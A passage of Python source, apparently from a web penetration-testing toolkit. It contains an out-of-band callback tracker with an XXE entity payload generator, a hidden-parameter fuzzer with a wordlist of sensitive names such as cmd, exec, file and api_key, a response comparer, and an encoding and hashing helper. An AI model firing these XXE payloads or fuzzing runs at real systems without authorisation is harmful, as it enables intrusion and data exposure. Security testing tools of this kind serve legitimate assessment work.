        p = self.generate_payload("http", f"xxe_{context}")
        return f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{p["payload"]}">]>'
    
    def record_interaction(self, payload_id: str, interaction_type: str,
                         details: Dict = None) -> None:
        """Record an interaction (callback received)"""
        if payload_id in self.payloads:
            self.payloads[payload_id]["triggered"] = True
            interaction = {
                "payload_id": payload_id,
                "type": interaction_type,
                "details": details or {},
                "timestamp": time.time()
            }
            self.payloads[payload_id]["interactions"].append(interaction)
            self.interactions.append(interaction)
    
    def check_interactions(self) -> List[Dict]:
        """Check for any triggered payloads"""
        triggered = []
        for pid, pdata in self.payloads.items():
            if pdata["triggered"]:
                triggered.append({
                    "id": pid,
                    "type": pdata["type"],
                    "context": pdata["context"],
                    "interactions": pdata["interactions"],
                    "created": pdata["created"]
                })
        return triggered


# ============================================================================
# PARAM MINER (Hidden Parameter Discovery)
# ============================================================================

class ParamMiner:
    """
    Discovers hidden/unlinked parameters in web applications.
    Uses response diffing to detect when a parameter has an effect.
    """
    
    # Common hidden parameters
    COMMON_PARAMS = [
        "debug", "test", "admin", "internal", "dev", "staging",
        "verbose", "trace", "log", "dump", "raw", "format",
        "callback", "jsonp", "redirect", "next", "url", "return",
        "token", "key", "api_key", "apikey", "secret", "password",
        "username", "user", "email", "id", "uid", "role", "type",
        "action", "cmd", "command", "exec", "run", "query", "search",
        "file", "path", "dir", "page", "include", "template",
        "sort", "order", "limit", "offset", "skip", "filter",
        "lang", "locale", "language", "currency", "country",
        "version", "v", "ver", "api_version", "accept", "content_type",
        "cache", "no_cache", "refresh", "reload", "force",
        "preview", "draft", "unpublished", "hidden", "private",
        "x-debug", "x-forwarded-for", "x-real-ip", "x-custom",
        "_method", "_token", "_csrf", "authenticity_token",
    ]
    
    def __init__(self):
        self.discovered: List[Dict] = []
        self.baseline: Optional[HTTPResponse] = None
    
    async def mine(self, request: HTTPRequest, send_fn: Callable = None,
                  wordlist: List[str] = None, batch_size: int = 10) -> List[Dict]:
        """
        Discover hidden parameters by observing response differences.
        Uses batching to reduce requests.
        """
        params_to_test = wordlist or self.COMMON_PARAMS
        discovered = []
        
        # Get baseline response
        if send_fn:
            self.baseline = await send_fn(request)
        
        if not self.baseline:
            return []
        
        baseline_len = self.baseline.size
        baseline_status = self.baseline.status_code
        baseline_headers = set(self.baseline.headers.keys())
        
        # Test in batches
        for i in range(0, len(params_to_test), batch_size):
            batch = params_to_test[i:i + batch_size]
            
            # Add all batch params to request
            modified = HTTPRequest(
                method=request.method,
                url=request.url,
                headers=dict(request.headers),
                body=request.body,
                cookies=dict(request.cookies)
            )
            
            # Add params to URL or body
            if modified.method == "GET":
                separator = "&" if "?" in modified.url else "?"
                param_str = "&".join(f"{p}=FUZZ" for p in batch)
                modified.url += f"{separator}{param_str}"
            else:
                if modified.body:
                    modified.body += "&" + "&".join(f"{p}=FUZZ" for p in batch)
                else:
                    modified.body = "&".join(f"{p}=FUZZ" for p in batch)
            
            if send_fn:
                response = await send_fn(modified)
            else:
                continue
            
            if response:
                # Check for differences
                if (response.status_code != baseline_status or
                    abs(response.size - baseline_len) > 50 or
                    set(response.headers.keys()) != baseline_headers):
                    
                    # Narrow down which param(s) caused the difference
                    for param in batch:
                        single_mod = HTTPRequest(
                            method=request.method,
                            url=request.url,
                            headers=dict(request.headers),
                            body=request.body,
                            cookies=dict(request.cookies)
                        )
                        
                        if single_mod.method == "GET":
                            sep = "&" if "?" in single_mod.url else "?"
                            single_mod.url += f"{sep}{param}=FUZZ"
                        else:
                            single_mod.body = (single_mod.body + f"&{param}=FUZZ") if single_mod.body else f"{param}=FUZZ"
                        
                        if send_fn:
                            single_resp = await send_fn(single_mod)
                            if single_resp and (
                                single_resp.status_code != baseline_status or
                                abs(single_resp.size - baseline_len) > 20
                            ):
                                discovered.append({
                                    "parameter": param,
                                    "effect": {
                                        "status_diff": single_resp.status_code != baseline_status,
                                        "size_diff": single_resp.size - baseline_len,
                                        "new_headers": list(set(single_resp.headers.keys()) - baseline_headers)
                                    },
                                    "confidence": 0.8
                                })
        
        self.discovered = discovered
        return discovered


# ============================================================================
# COMPARER (Differential Analysis)
# ============================================================================

class Comparer:
    """
    Compares HTTP responses to identify differences.
    Useful for detecting blind vulnerabilities and parameter effects.
    """
    
    @staticmethod
    def compare_responses(resp1: HTTPResponse, resp2: HTTPResponse) -> Dict:
        """Compare two HTTP responses"""
        differences = {
            "status_code": {
                "same": resp1.status_code == resp2.status_code,
                "values": [resp1.status_code, resp2.status_code]
            },
            "body_length": {
                "same": resp1.size == resp2.size,
                "diff": resp2.size - resp1.size,
                "values": [resp1.size, resp2.size]
            },
            "response_time": {
                "same": abs(resp1.time_ms - resp2.time_ms) < 100,
                "diff": resp2.time_ms - resp1.time_ms,
                "values": [resp1.time_ms, resp2.time_ms]
            },
            "headers": {
                "added": list(set(resp2.headers.keys()) - set(resp1.headers.keys())),
                "removed": list(set(resp1.headers.keys()) - set(resp2.headers.keys())),
                "changed": []
            },
            "body_diff": {
                "identical": resp1.body == resp2.body,
                "similarity": 0
            }
        }
        
        # Header value changes
        for key in set(resp1.headers.keys()) & set(resp2.headers.keys()):
            if resp1.headers[key] != resp2.headers[key]:
                differences["headers"]["changed"].append({
                    "header": key,
                    "before": resp1.headers[key][:100],
                    "after": resp2.headers[key][:100]
                })
        
        # Body similarity (simplified Jaccard)
        if resp1.body and resp2.body:
            words1 = set(resp1.body.split())
            words2 = set(resp2.body.split())
            intersection = len(words1 & words2)
            union = len(words1 | words2)
            differences["body_diff"]["similarity"] = round(intersection / union, 4) if union > 0 else 1.0
        
        # Overall verdict
        differences["significant"] = (
            not differences["status_code"]["same"] or
            abs(differences["body_length"]["diff"]) > 100 or
            differences["response_time"]["diff"] > 3000 or
            differences["body_diff"]["similarity"] < 0.8
        )
        
        return differences


# ============================================================================
# DECODER
# ============================================================================

class Decoder:
    """Universal encoding/decoding/hashing utility"""
    
    @staticmethod
    def decode(data: str, encoding: str) -> str:
        """Decode data from specified encoding"""
        try:
            if encoding == "base64":
                return base64.b64decode(data).decode('utf-8', errors='replace')
            elif encoding == "base64url":
                # Add padding if needed
                padded = data + "=" * (4 - len(data) % 4)
                return base64.urlsafe_b64decode(padded).decode('utf-8', errors='replace')
            elif encoding == "url":
                return urllib.parse.unquote(data)
            elif encoding == "double_url":
                return urllib.parse.unquote(urllib.parse.unquote(data))
            elif encoding == "hex":
                return bytes.fromhex(data).decode('utf-8', errors='replace')
            elif encoding == "html":
                import html
                return html.unescape(data)
            elif encoding == "unicode":
                return data.encode().decode('unicode_escape')
            elif encoding == "jwt":
                # Decode JWT payload
                parts = data.split(".")
                if len(parts) >= 2:
                    payload = parts[1]
                    padded = payload + "=" * (4 - len(payload) % 4)
                    return base64.urlsafe_b64decode(padded).decode('utf-8')
                return data
            else:
                return data
        except Exception as e:
            return f"Error: {str(e)}"
    
    @staticmethod
    def encode(data: str, encoding: str) -> str:
        """Encode data to specified encoding"""
        try:
            if encoding == "base64":
                return base64.b64encode(data.encode()).decode()
            elif encoding == "base64url":
                return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")
            elif encoding == "url":
                return urllib.parse.quote(data)
            elif encoding == "double_url":
                return urllib.parse.quote(urllib.parse.quote(data))
            elif encoding == "hex":
                return data.encode().hex()
            elif encoding == "html":
                return "".join(f"&#{ord(c)};" for c in data)
            elif encoding == "unicode":
                return "".join(f"\\u{ord(c):04x}" for c in data)
            else:
                return data
        except Exception as e:
            return f"Error: {str(e)}"
    
    @staticmethod
    def hash(data: str, algorithm: str) -> str:
        """Hash data with specified algorithm"""
        try:
            if algorithm == "md5":
                return hashlib.md5(data.encode()).hexdigest()
            elif algorithm == "sha1":
                return hashlib.sha1(data.encode()).hexdigest()
            elif algorithm == "sha256":
                return hashlib.sha256(data.encode()).hexdigest()
            elif algorithm == "sha512":
                return hashlib.sha512(data.encode()).hexdigest()
            else:
                return hashlib.new(algorithm, data.encode()).hexdigest()
        except Exception as e:
            return f"Error: {str(e)}"
    
    @staticmethod
    def smart_decode(data: str) -> List[Dict]:
        """Try multiple decodings and return results"""
        results = []
        
        # Try Base64
        try:
            decoded = base64.b64decode(data + "=" * (4 - len(data) % 4))
            if decoded.isascii() or all(32 <= b < 127 or b in [9, 10, 13] for b in decoded):
                results.append({"encoding": "base64", "result": decoded.decode('utf-8', errors='replace')})
        except Exception:
            pass
        
        # Try URL decode
        url_decoded = urllib.parse.unquote(data)
        if url_decoded != data:
            results.append({"encoding": "url", "result": url_decoded})
        
        # Try Hex
        try:
            if all(c in '0123456789abcdefABCDEF' for c in data) and len(data) % 2 == 0:
                hex_decoded = bytes.fromhex(data).decode('utf-8', errors='replace')
                results.append({"encoding": "hex", "result": hex_decoded})
        except Exception:
            pass
        
        # Try JWT
        if data.count('.') == 2:
            try:
                parts = data.split('.')
                header = base64.urlsafe_b64decode(parts[0] + "==").decode()
                payload = base64.urlsafe_b64decode(parts[1] + "==").decode()
                results.append({"encoding": "jwt", "result": f"Header: {header}\nPayload: {payload}"})
            except Exception:
                pass
        
        return results
